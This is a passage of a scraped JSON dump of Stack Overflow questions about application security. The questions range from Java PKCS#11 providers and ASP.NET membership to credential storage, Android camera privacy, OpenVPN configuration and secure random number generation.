allow?</p>\n\n<p>Thanks</p>\n"},{"tags":["java","security","provider","smartcard","pkcs#11"],"answer_count":4,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":4340,"score":6,"question_id":5172069,"title":"Access restriction on sun.security.pkcs11.SunPKCS11","body":"<p>I'm trying to setup a PKCS11 provider for accessing a smartcard.\nI installed a PKCS11 library on my system and followed the instructions in the <a href=\"http://download.oracle.com/javase/1.5.0/docs/guide/security/p11guide.html\" rel=\"nofollow\" title=\"Java PKCS#11 Reference Guide\">Java PKCS#11 Reference Guide</a>.\nIn the reference they simply create an instance of <code>sun.security.pkcs11.SunPKCS11</code> and pass the name of the configuration file to the constructor.\nWhen I try to compile the following code</p>\n\n<pre><code>Provider p = new sun.security.pkcs11.SunPKCS11(\"pkcs11.cfg\");\nSecurity.addProvider(p);\n</code></pre>\n\n<p>I get the following error.  </p>\n\n<blockquote>\n  <p>Access restriction: The constructor SunPKCS11(String) is not accessible due to restriction on required library /usr/lib/jvm/java-6-sun-1.6.0.24/jre/lib/ext/sunpkcs11.jar</p>\n</blockquote>\n\n<p>What am I doing wrong?\nI use Eclipse 3.5 with Java SE 1.6 under Ubuntu x86.</p>\n\n<p>Best regards. </p>\n"},{"tags":["python","security","architecture","oauth-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":13028310,"title":"Special pages protection","body":"<p>for once, I do not came with a \"technical\" question but rather with an architectural/structural question.</p>\n\n<p>I'm currently building a web-plateform, there is a public zone and a private zone.\nall URLs are handle by a process which have to check which ressource is request and then redirect the request to the correct process.</p>\n\n<p>Most of time, the process is just to check if the requested page is available and public.\nIf it's not available, the pageHandler process thrown an HTTP Error document depending of the error.\nIf the page is a private page, the pageHandler process request for authentication and the OAuthHandler do his job.</p>\n\n<p>Now, I'm wondering one thing. Do I have to protect my private pages individualy with an authentication process in it or can I leave them like that?</p>\n"},{"tags":["javascript","security","console"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13028344,"title":"Is there a way to stop Javascript commands being executed in console?","body":"<p>As per the question title.</p>\n\n<p>Although <em>not</em> required; I would like to stop people from executing functions on my page via the console... Is this even possible?</p>\n\n<p>I've tried a few things, this is the closest I've come - but this doesn't work :(</p>\n\n<pre><code>    window.onresize = function(){\n        if((window.outerHeight - window.innerHeight) &gt; 100) {\n            //stop commands here?\n        }\n    }\n    window.onload = function() {\n        if (typeof console !== \"undefined\" || typeof console.log !== \"undefined\") {\n            if (window.console &amp;&amp; (window.console.firebug || window.console.exception)) {\n                    //stop commands here?\n            }\n        }\n    }\n</code></pre>\n\n<p><strong>EDIT:</strong><br />\nI don't have to disable the console, just function calls made within it - either solution would be fine though ;)</p>\n\n<p><strong>EDIT2:</strong><br />\nSo, to get this right... There is now no way of detecting the console crossbrowser at all?</p>\n\n<p><strong>EDIT3:</strong><br />\nI've sort of got around it by doing the following, although the JS functions are still in place - the elements that they relate to are not... Not a great fix, but I guess it'll do... :(\n<br /></p>\n\n<pre><code>        setInterval(function() {\n            if (!$.browser.mozilla) {\n                if((window.outerHeight - window.innerHeight) &gt; 100) {\n                    alert(\"DISABLED!\");\n                    $('body').remove();\n                    return false;\n                }\n            }\n            if (window.console &amp;&amp; (window.console.firebug || window.console.exception)) {\n                alert(\"DISABLED!\");\n                $('body').remove();\n                return false;\n            }\n        }, 750);\n</code></pre>\n"},{"tags":["java","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13028345,"title":"How to add the initial, very first user to a web app user list (this user would then add other users)?","body":"<p>I am building a web app that goes to many customers. Tha app enables customers to manage their users: create user with user name, password, permissions, etc. There needs to be first admin user that has a permisssion to create other users.</p>\n\n<p>Problem is the initial user setup:</p>\n\n<ul>\n<li>When the app is first installed, how should the first user be added?</li>\n<li>Should this user be pre-installed in the user database? </li>\n<li>Which password to set for this initial user and which email to recover the password in case it is forgotten?</li>\n<li>Etc.</li>\n</ul>\n\n<p>How are situations like this handled? </p>\n"},{"tags":["java","security","reflection","sandbox"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13027602,"title":"Security when compiling custom language to Java","body":"<p>I'm compiling user-inputted code in a custom language to Java. The resulting code, as of now, can only have one class with static methods. Because the user code is insecure, I've set up a security manager and I've restricted file, network, and many other permissions. The code is also being run on a sandboxed virtual machine. </p>\n\n<p>What else can I do to ensure the machine will not be compromised. Specifically, given all the rumblings about Java insecurity, are there test packages or suites that I can use to try to break out of the Java sandbox into the VM itself?</p>\n"},{"tags":["asp.net","security","membership"],"answer_count":5,"favorite_count":1,"up_vote_count":10,"down_vote_count":0,"view_count":3681,"score":10,"question_id":375524,"title":"How can you test if an ASP.NET membership password will meet configured complexity requirements?","body":"<p>I have a ASP.NET page which allows an administrator to change the password for a user.  Since the administrator does not know the user's password, I am using the following:</p>\n\n<pre><code>MembershipUser member = Membership.GetUser(_usernameTextBox.Text);\nmember.ChangePassword(member.ResetPassword(), _passNewTextBox.Text);\n</code></pre>\n\n<p>-- as described by this <a href=\"http://stackoverflow.com/questions/287320/how-do-you-change-a-hashed-password-using-aspnet-membership-provider-if-you-don\">SO question</a>.  </p>\n\n<p>If the new password does not meet the complexity requirements which are configured in the web.config file, then the password will have been reset, but not changed to the desired one.  If the new password does not meet complexity requirements, then the password should not change at all.</p>\n\n<p>Is there an easy way to test the new password against the complexity requirements?</p>\n"},{"tags":[".net","web-services","security","authentication","iis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13026020,"title":"Authenticate requests to a web site hosted in IIS against AD using username and password","body":"<p>I have a web site which when called by a client using WebClient (c#) it returns data. I want to secure this web site so that all clients calling my web site for data need to provide username/passowrd so i can authenticate them. My web site is hosed in IIS. Additionaly i later want to implement logging (e.i, which client is calling my web site etc).</p>\n\n<p>I am thinking of the following:\n1- Should i change my web site to wcf project in order to easly implement the authnetication?\n2- I want to use Active directory for storing info about users. So if a client is registered in AD and calls my web site, then it is accepted, otherwise denied.\n3- I would like to use username and password (because i want to authenticate againt AD and also want to know who the calling client is and later implement logging).\n4- Any idea on what to use and how to implement the logging?\n5 how can IIS help me implementing this?\n6- Can AD be innstalled on the same mashine that has ISS (hosting my web site) installed? Can i install AD on my pc (win 7) or it must be installed on Win Server 2008 R2?\n7- Is there any problem with sending username adn password to contact my web site, is it secure enough?\n8- i have heard about basic authentication, is it something possible to use in my case?\n9- \nAny code samples showing code on how the client calls the service with username/password and how the server gets the request and authenticates it against AD. I would really be very thankful. </p>\n\n<p>I have read and googled alot and a just got more confused.</p>\n\n<p>Thanks</p>\n"},{"tags":["java","security","soap","passwords","jira"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":12516053,"title":"Secure password storing while authenticating to JIRA via SOAP service","body":"<p>I am writing an application, in Java, which needs to log in to a remote SOAP service (JIRA) prior to calling methods on that service.</p>\n\n<p>I have looked at examples of how to do this, for example <a href=\"http://www.j-tricks.com/1/post/2010/8/jira-soap-client.html\" rel=\"nofollow\">http://www.j-tricks.com/1/post/2010/8/jira-soap-client.html</a>, however I am concerned that I need to put the password in memory at some point.</p>\n\n<p>I've read that I should store the password as a char[] but still, I'm concerned about storing the password in the clear at all.  </p>\n\n<p>How should I store the password used by my client to log into the SOAP service?  And how should I read it and pass it to JIRA?</p>\n\n<p><em>EDIT</em>\nThis application will be using Spring so it's likely the password would be stored in the bean configuration file rather than in the code.</p>\n"},{"tags":["security","red5"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13020321,"title":"Red5 Security Tip","body":"<p>I recently watched a video demonstrating that a red5 application with only stub code is capable of streaming and recording. This means anyone could use my server to stream their content and that's best case. So my questions are\n 1. To me this seems that red5 doesn't take security seriously; am I incorrect to assume this?\n 2. Do they rapidly release security updates?\n 3. If the above are yes then what implementation precautions should I take to solve this and other \"undocumented features\"?</p>\n\n<p>(topical answers are fine all I need is enough to Google the specifics)</p>\n"},{"tags":["perl","security"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":89,"score":2,"question_id":13023594,"title":"Executing system commands safely while coding in Perl","body":"<p>Should one really use external commands while coding in Perl? I see several disadvantages of it. It's not system independent plus security risks might also be there. What do you think? If there is no way and you have to use the shell commands from Perl then what is the safest way to execute that particular command (like checking pid, uid etc)?</p>\n"},{"tags":["security","scala","playframework","authorization"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13022072,"title":"Is there an example scala play 2 project integrating Deadbolt 2 with SecureSocial?","body":"<p>I am looking for suggestions of play 2.0 authorization modules you would recommend using in conjunction with SecureSocial.</p>\n\n<p>I am building a Scala Play 2.0.4 application, and I'm in the process of integrating security. I've completed the integration of the SecureSocial module to provide authentication, and I'm very happy with it.</p>\n\n<p>Next, I would like to integrate authorization into my application, but I'm having trouble finding a play 2.0 authz module that's ready for use. I've looked quite a bit at Deadbolt-2, however it seems it's not ready for use in a scala application -- at least I've been unable to determine how to implement the ScalaboltHandler to provide a RoleHolder via SecureSocial. I've examined the SociallySecure example, but that appears to not be current with play 2.0. Other examples of using deadbolt are overly simplistic to be useful. I've read there is a new release of deadbolt pending, but it's not clear to me whether this will fully support a scala application.</p>\n"},{"tags":["web-services","security","rest","hash","checksum"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13025034,"title":"Writing a secure REST web service","body":"<p>Many of them are getting confused on how to write a secure rest webservice, for those who are confused to which method to use this post will be helpful in a great way.</p>\n\n<p><strong>Possible ways of writing REST services(Partially Secure)</strong></p>\n\n<ul>\n<li><p>You realize that literally passing the credentials over HTTP leaves that data open to being sniffed in plain-text; After the Gawker incident, you realize that plain-text or weakly-hashed anything is usually a bad idea.</p></li>\n<li><p>You realize that hashing the password and sending the hash over the wire in lieu of the plain-text password still gives people sniffing at least the username for the account and a hash of the password that could (in a disturbing number of cases) be looked up in a Rainbow Table.</p></li>\n<li><p>you exclaim, because in this case (which is really a username/password scenario all over again) you still suffer from the same problems (sniffed traffic) that sending the username and password in plain text had.</p></li>\n<li><p>At this point you are about to give up and concede to using <strong>OAuth</strong>, but you insist that there has to be a secure but relatively easy way to design a public web API that can keep credentials private.</p></li>\n</ul>\n"},{"tags":["android","security","android-intent","camera","picture"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":13007952,"title":"Capture image in Android via intent (ACTION_IMAGE_CAPTURE)","body":"<p>Is there a \"secure\" way to invoke the android camera with the intent <code>MediaStore.ACTION_IMAGE_CAPTURE</code> to capture a picture?\nI am using the following code to take a snapshot from the camera:</p>\n\n<pre><code>Uri tempFile = Uri.fromFile(tempFile()); // returns a temporary stored files that is \"Context.MODE_WORLD_WRITEABLE\" so that android can put the file in this location\n// tempFile looks like: file:///data/data/com.example.myapp/files/temp_picture.jpg\nIntent camera = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);\ncamera.putExtra(MediaStore.EXTRA_OUTPUT, tempFile);\nstartActivityForResult(camera, Constants.REQUESTCODE_PICTURE_RESULT);\n</code></pre>\n\n<p>After that (returning from camera \"<code>RESULT_OK</code>\") I am copying the tempFile to the secured application store <code>Context.MODE_PRIVATE</code> and deleting the <code>tempFile</code>.\nEverything works fine, the picture is taken and stored on the given Uri. But also the image is placed (in case of my current development device \"HTC Sensation\") in the galery\nfrom my device (location is <code>/mnt/sdcard/DCIM/100MEDIA/IMAG00XX.jpg</code>). Why is the picture stored twice, I didn't even mention this location in my code? Is this a HTC \"feature\" or does the android camera store the file twice for media\nscanning?</p>\n\n<p>I also tried to get the Bitmap from the camera by omitting the <code>MediaStore.EXTRA_OUTPUT</code> parameter, but with this code I am only getting a thumbsize-picture from the camera (no full resolution).</p>\n\n<p>I read a lot about the android camera, but I have to fetch an image from the camera in a \"secured\" way (no other app should read the data taken from the camera). I already\nthought about implementing my own camera surface to catch a picture, but with this approach I must code a lot of stuff (flash, saturation, effects, zoom...) that the build in camera application already provides. Is it really that hard to take a picture on the android system?</p>\n"},{"tags":["security","web-applications","public-key-encryption","saml-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13022374,"title":"How to best encrypt data-at-rest for users logging in with SAML?","body":"<p>I have a web application which allows SAML authentication by users using their own identity provider. I have fields in a database in my application which I want to ensure that only authorized users can decrypt (and developers/administrators of the system are NOT implicitly authorized).  For users logging in with a password this is easy - make an RSA keypair where the private key is encrypted with their login password, and update a keychain if the password ever changes.  But how can this be done when there is no login password, because the user has been authenticated with SAML?</p>\n"},{"tags":["android","asp.net","ios","security","payment"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13022944,"title":"Payment security on Android App","body":"<p>I am developing an application which helps user can browse and buy books. The client can be Android ,iOS, Mac. The server is Asp.net Web APIs. </p>\n\n<p>I know there are many service for payment. One of these is Authorize.net and I think I will use it. When user pay for a book, he/she will got a unique link to download data from server. I want to prevent other users who has the link ( by some hacking) download data. Not yet, I want to keep user payment information in secure.</p>\n\n<p>I have no experience in security. So, please give some advices to implement this. Thanks.</p>\n"},{"tags":["java","android","security","encryption","aes"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12994458,"title":"How to store the key used to encrypt files in android by using AES algorithm","body":"<p>im try develop a encryption app for android by using AES algorithm ,where should i store the key. the idea is that the user provides a password and a key is generated.how can i do this process safer.thanks in advance</p>\n"},{"tags":["security","cryptography","communication"],"answer_count":9,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1076,"score":4,"question_id":1914257,"title":"When can you trust yourself to implement cryptography based solutions?","body":"<p>I've read quite a few times how I <a href=\"http://blogs.msdn.com/ericlippert/archive/2009/12/14/use-the-right-tool-for-the-job.aspx\" rel=\"nofollow\">shouldn't</a> use <a href=\"http://www.codinghorror.com/blog/archives/001267.html\" rel=\"nofollow\">cryptography</a> if I'm not an expert. Basically both Jeff and Eric tell you the same:</p>\n\n<blockquote>\n  <p>Cryptography is difficult, better buy the security solution from experts than doing it yourself.</p>\n</blockquote>\n\n<p>I completely agree, for a start it's incredibly difficult to perceive all possible paths an scenario might take, all the possible attacks against it and against your solution... but then When should we use it?</p>\n\n<p>I will face in a few months with the task of providing a security solution to a preexisting solution we have. That is, we exchange data between servers, second phase of the project is providing good security to it. Buying a third party solution will eat up the budget anyway so ... When is it good to use cryptography for a security solution? Even if you are not a TOP expert.</p>\n\n<p><strong>Edit:</strong> To clarify due to some comments.\nThe project is based on data transport across network locations, the current implementation allows for a security layer to be placed before transport and we can make any changes in implementation we like (assuming reasonable changes, the architecture is well design so changes should have an acceptable impact). The question revolves around this phrase from Eric Lippert:</p>\n\n<blockquote>\n  <p>I don’t know nearly enough about cryptography to safely design or implement a crypto-based security system.</p>\n</blockquote>\n\n<p>We're not talking about reinventing the wheel, I had in mind a certain schema when I designed the system that implied secure key exchange, encryption and decryption and some other \"counter measures\" (man in the middle, etc) using C# .NET and the included cryptography primitives, but I'm by no means an expert in the field so when I read that, I of course <strong>start doubting myself. Am I even capable of implementing a secure system?</strong> Would it always be parts of the system that will be insecure unless I subcontract that part?</p>\n"},{"tags":["java","security","random"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":79,"score":-1,"question_id":13005966,"title":"Is the following random number generation without bias?","body":"<p>Would the following code produce a random number with or without bias?</p>\n\n<pre><code>    int numberToGenerate = 20;\n    int rangeUpperLimit = 30;\n    SecureRandom random = SecureRandom.getInstance(\"SHA1PRNG\");\n\n    for (int i = 0; i &lt; numberToGenerate; i++) {\n        int randomInt = random.nextInt(rangeUpperLimit); \n        // Do something with it.\n    }        \n</code></pre>\n\n<p>The values are used to pick <code>chars</code> from a <code>String</code> of length 30, hence the range 0-29. The code to pick the <code>char</code> values is omitted as it is not relevant to the question.</p>\n"},{"tags":["security","http","encryption","ssl","get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":13021854,"title":"How to send data securely as parameters in URL?","body":"<p>As <a href=\"http://stackoverflow.com/a/2629241/327528\">this answer</a> suggests, it isn't a good idea to have sensitive information in a URL string.  Even though it will be encrypted if you use SSL, it will be stored in a server log in clear text.</p>\n\n<p>How then should GET arguments be passed to a web server securely?</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13020576,"title":"PHP Apache - How do I create a secure working directory, invisible to web","body":"<p>I have created a PHP script that takes a large html file and, using DOMDocument, chops it up into smaller files.  To save on script memory and without having to use a DB, I've done this sequentially and saved them as hundreds of html files.  My question is, how do I make sure these files cannot be visible to the outside world, but still retain the ability to use them as resources for future processing (piece together various files and display them on a page)?</p>\n\n<p>I'm using Amazon EC2 - Centos 6/Apache.</p>\n\n<p>Thank you!</p>\n"},{"tags":["ios","security"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13013043,"title":"iOS secure directory for specific app","body":"<p>Is there any way to make directory in iOS secured and protected just for my app?\nin my application user buys books and I save books on documents sub directory, so I don't want any other application to access this directory \nany suggestions ?\nshould I encrypt this data ?</p>\n"},{"tags":["php","security"],"answer_count":8,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":3120,"score":6,"question_id":3012315,"title":"PHP Security best practices","body":"<p>I have implemented a project on PHP/MYSQL now i needs to secure my project, please let me know the security issues and how to tackle in PHP</p>\n"},{"tags":["java","security","neo4j"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":13015323,"title":"Prevent some users modifying a Neo4J node","body":"<p>In my Neo4J database, I want to prevent particular users modifying nodes.  I would like to allow any user to be a 'guest' and view data and certain users to be admins and view and edit as much data as they like.</p>\n\n<p>This needs to be part of the neo4j server, I would rather not implement a webservice over neo4j.</p>\n"},{"tags":["php","security",".htaccess","ip"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12988408,"title":"Can I use PHP to limit a page only on a set of IPs?","body":"<p>I have a folder which contains an admin panel - no password or session management is on the script. The URL is complex to get too. To save time before making an admin login system. Can I restrict a folder and all sub folders and files via .<code>htaccess</code> or should I make a PHP include which checks an Array list of IPs and then just does <code>die()</code> or redirect <code>Header()</code> to external source?</p>\n\n<p>Thanks</p>\n"},{"tags":["windows","security","named-pipes"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":1,"view_count":52,"score":2,"question_id":12980403,"title":"How can I tell if the server side of a named pipe is an admin?","body":"<p>I am trying to use named pipes on Windows XP SP2+.  The pipe server will be a service, running as some kind of administrator / system level account.  The pipe client could be any user, possibly a guest, possibly an admin.  In my case, I am fine with having a guest account successfully communicate with my service running as administrator.</p>\n\n<p>Before I start using the pipe in my client code, I want to validate that the other side of the pipe is really owned by an administrator / the system.</p>\n\n<p>I have discovered the GetSecurityInfo function, and I think I should be able to use that as part of the solution.  However, I don't know how to get from a SID to an \"is admin\" check.</p>\n"},{"tags":["java","security","unit-testing","mocking"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13018059,"title":"How do I set the AccessControlContext in Java?","body":"<p>I'm fairly new to Java security stuff and I'm having a hard time figuring out how to google the right answer to this.</p>\n\n<p>I have a line of code that reads <code>AccessController.getContext()</code>.  </p>\n\n<p>I want to run a test where I mock the result of this.  Unfortunately, I have no idea what I'm doing.  </p>\n\n<p>How do I set the <code>AccessControlContext</code> returned by <code>AccessController.getContext()</code>?</p>\n\n<p><strong>Update</strong></p>\n\n<p>Just to clarify, I know how to mock interfaces.  AccessController is a Java security feature.  I'm having trouble finding out how to set my own context so that when a method calls <code>AccessController.getContext()</code> it returns a AccessControlContext of my choosing.</p>\n"},{"tags":["java","security","jsf","ejb","cdi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":13015504,"title":"CDI and EJB, security issues?","body":"<p>I am reviewing my code from since I picked up on JSF.\nOne of the most complex issues has come up once again. The decision between CDI and EJB.</p>\n\n<p>I am using three layers and I wonder which type of annotation to use on each of them:\n- Backing beans (the Controller as defined in MVC)\n- The service layer\n- DAO's</p>\n\n<p>My backing beans are using CDI, as long as I don't need anything from EJB.\nBut I am stuck on those other two. I remember reading about using EJB beans because of the pooling functionalities, which would prevent massive loads of requests (or attacks, if you will).\nSo in short, is there ANY reason to use EJB (Stateless, Stateful, LocalBean et cetera), considering security or anything else (excluded ViewScoped)?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["javascript","security","iframe","third-party"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":385,"score":3,"question_id":5816166,"title":"When allowing users to embed content from another website are iframes better?","body":"<p>When allowing users to embed content from another website are iframes better than using let's say a javascript document.write to put the content on the page?</p>\n\n<p>What I have is a social networking website in development, and I want to allow users to embed their profiles into their web pages with a snipet of code.</p>\n\n<p>My concern is that if the code generates an iframe they could reference the iframe and execute functions/code in it. However if I use javascript and it just generates a document.write functions that displays that same information, would that not be better and more secure?</p>\n\n<p>I've seen some people argue that iframes are more secure and fit for embeding third party content (which is what I would be) on websites. Then I see other posts saying that iframe security is vague and unsure if it's a risk or not.</p>\n"},{"tags":["security","deployment","ssh","capistrano"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12981217,"title":"How to restrict user access to only deployments via Capistrano? (deployment workflow issue)","body":"<p>I look for good practices for deploying with capistrano.</p>\n\n<p>I would like to start out with a short description how I used to do deployment.</p>\n\n<p>capistrano is installed locally on a developer's computer. I deploy thought gateway with capistrano option <code>:gateway</code>. Firstly, I thought that with <code>:gateway</code> option I need to have ssh connection only to gateway host, but it turns out that I need ssh connection (<em>public key</em>) to all hosts where I want to deploy to. </p>\n\n<p>I would like to find a convenient and secure way to deploy application.</p>\n\n<p>For example, in case when new developer starts working, is much more convinient to put his *public_key* only on gateway server and not on all applications servers. On the other hand I don't want him to have any connection to servers in particular <em>ssh</em> to gateway, just because he is developer, he needs to do only deployments.</p>\n\n<p>If you are aware of good practices for deploying with capistrano, please, let me know.</p>\n"},{"tags":["java","security","certificate"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":63,"score":3,"question_id":12974770,"title":"Automatically run java applications with trusted certificates","body":"<p>I know there is a way to inject trusted certificates into the java runtime <a href=\"http://docs.oracle.com/javase/tutorial/security/toolsign/rstep2.html\" rel=\"nofollow\">like this</a>, but when a user starts an application using this certificate, he still gets a window much like this</p>\n\n<p><img src=\"http://i.stack.imgur.com/LviZI.png\" alt=\"The application's digital signature has been verified. Do you want to run the application?\"></p>\n\n<p>When accepting, the certificate is visible in the java control panel.</p>\n\n<p>How can I get the certificate in there without the user needing to accept that warning? I want him to run the application without any obstacles when doing so, meaning the certificate is already trusted AND the application can be run immediately.</p>\n"},{"tags":["wordpress","security","plugins","hook"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13012115,"title":"wordpress-liked plugins syystem","body":"<p>I want to build a wordpress-liked cms system with plugins, but I wonder how wordpress manage security issues on his web free hosting platform. I mean for example if a developer writes a plugin that performs deletion in the file system. </p>\n\n<p>Is it possible to restrict the scope of a plugin for security purpose?</p>\n\n<p>What should I take into account when building such system?</p>\n"},{"tags":["c#","security"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":153,"score":6,"question_id":13009944,"title":"Disassembling C#","body":"<p>I've got a question regarding C#.</p>\n\n<p>I am currently working on a medical software product, and one of the important things is to make sure that the patient's data is encrypted.  I got two questions regarding this:</p>\n\n<p>1.) How secure is the Microsoft .NET implementation of AES (Rijndael) from System.Security.Cryptography? Does it have any known security flaws, or am I fine just using the MS implementation? (note, I know the basic background of how these algorithms work, but I am not really that deep into it to get an idea of how it works).</p>\n\n<p>2.) Since the data is stored on the same PC as the application, how hard is it to get information from a C# application? Assuming I have somewhere in the code</p>\n\n<pre><code>string encrypPassword = \"ThisIsMyPassword\";\nstring encryptedString = EncryptString(ClearString, encrypPassword);\n// save encryptedString to harddrive\n</code></pre>\n\n<p>I know that an attacker could just go down to the assemble code, and at that point there is nothing at all I can do against this (the system has to be able to encrypt / decrypt the data), but is there like a shortcut for C# to get the encrypPassword, since it is managed, or does something like this still require you to go down to the assemble code?</p>\n"},{"tags":["java","security","hacking","penetration-testing"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":66,"score":0,"question_id":12661567,"title":"pentesting java applet","body":"<p>Does anyone have an idea about how to pentest a java applet. I mean if there is a website that is written in php .. we try to pentest the site against sql injection, XSS and CSRF, but how can I pentest a java applet..and what are kind of vulnerabilities I might found.. buffer overflow !! ? or .... For example, let's assume I have a java file called room.jnlp that opens a chat room .. I tried to change my profile name to</p>\n\n<p><code>&lt;h1&gt;Profile name&lt;/h1&gt;</code> </p>\n\n<p>but I was sure that the h1 tags will not be executed because it is not a webserver. I also was trying to enter a very long string in the profile name hoping to find a buffer overflow but I was sure this is not gonna happen .. because java checks the boundaries of its arrays</p>\n\n<p>I also would be grateful if you could provide me with online tutorials or some books that talk about how to pentest java application, applets and servlets. \nThank you :) </p>\n"},{"tags":["security","openvpn","network-security"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":9,"score":2,"question_id":13010081,"title":"OpenVPN bad source address from client","body":"<p>I have one problem with OpenVPN.\nThere are a lot drops records in the openvpn log file on the server:</p>\n\n<p><em>Mon Oct 22 10:14:41 2012 us=726541 laptop/ххх:1194 MULTI: bad source address from client [192.168.1.107], packet dropped</em></p>\n\n<pre><code>grep -E \"^[a-z]\" server.conf  \n-----\nport 1194  \nproto udp\ndev tun \nca data/ca.crt \ncert data/server.crt\nkey data/server.key \ndh data/dh1024.pem \ntls-server\ntls-auth data/ta.key 0\nremote-cert-tls client \ncipher AES-256-CBC\ntun-mtu 1200\nserver 10.10.10.0 255.255.255.0 \nifconfig-pool-persist ipp.txt\npush \"redirect-gateway def1 bypass-dhcp\"\npush \"dhcp-option DNS 8.8.8.8\"\nclient-to-client\nclient-config-dir /etc/openvpn/ccd\nroute 10.10.10.0 255.255.255.0\nkeepalive 10 120\ncomp-lzo\npersist-key\npersist-tun\nmax-clients 5\nstatus /var/log/status-openvpn.log\nlog  /var/log/openvpn.log\nverb 4\nauth-user-pass-verify /etc/openvpn/verify.sh via-file\ntmp-dir /tmp\nscript-security 2\n-----\n\ncat ccd/laptop\n-----\niroute 10.10.10.0 255.255.255.0\n-----\n\ncat client.conf \n-----\nremote server ip 1194\nclient\ndev tun\nping 10\n\ncomp-lzo\nproto udp\ntls-client\ntls-auth data/ta.key 1\npkcs12 data/vpn.laptop.p12\n\nremote-cert-tls server\n#ns-cert-type server\npersist-key\npersist-tun\ncipher AES-256-CBC\n\nverb 3\npull\n\nauth-user-pass /home/user/.openvpn/users.db \n-----\n</code></pre>\n\n<p>According to \"Jan Just Keijser - OpenVPN 2 Cookbook\" root of the problem is incorrect config options.</p>\n\n<p>See the screenshot\n<img src=\"http://i.stack.imgur.com/4vPwN.png\" alt=\"See the screenshot\"></p>\n\n<p><strong>But, as you see, my config has such options.\nCould you please help me to solve this problem.</strong></p>\n"},{"tags":["html5","security","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13008962,"title":"html5 direct file uploads security risk?","body":"<p>I'm using html5 canvas based image uploads with base64 encoding (default). server-side: when a request is posted base64 headers are removed and base64_decode function (eval php function is not used at all) is applied and saved as jpg directly onto filesystem. </p>\n\n<p>Since i'm saving uploaded file as an exact copy of what is uploaded. if a user uploads a malicious php/js file masqueraded as jpg and a visitor views that bad jpg is this a security risk? if yes I'll process uploaded file with gd. after gd-processed i assume those will be gone.</p>\n"},{"tags":["wcf","security","certificate"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13006889,"title":"Use a Self-Signed Certificate in production for a WCF service hosted in IIS?","body":"<p>I have a project consisting of a website (ASP.NET WebForms) and a desktop application (WinForms + WPF). Right now I'm designing a WCF Service to be hosted in IIS, that will be consumed by these applications. Service is authenticated by an Active Directory. Unfortunatelly in WCF all security related stuff needs a certificate to work. </p>\n\n<p>On the development machine I know I can use a temporary certificate, but the problem is with production. The client server is accessible only from the intranet, so there is no SSL configured and no certificate (and it's not an option to buy one). </p>\n\n<p><em>My question is: can I use a IIS Self-Signed Certificate on production?</em> What are the disadventages of this? Until now I have used WCF only for simple AJAX calls, and haven't played with the security stuff and certificates. </p>\n"},{"tags":["c#",".net","asp.net","security","random"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3122,"score":3,"question_id":4892588,"title":"RNGCryptoServiceProvider - Random Number Review","body":"<p><strong>While looking for best attempts at generating truly random numbers, I stumbled upon this code example.</strong> </p>\n\n<p>Looking for opinions on this snippet.</p>\n\n<pre><code>using System;\nusing System.Security.Cryptography;\n\nprivate static int NextInt(int min, int max)\n{\n    RNGCryptoServiceProvider rng = new 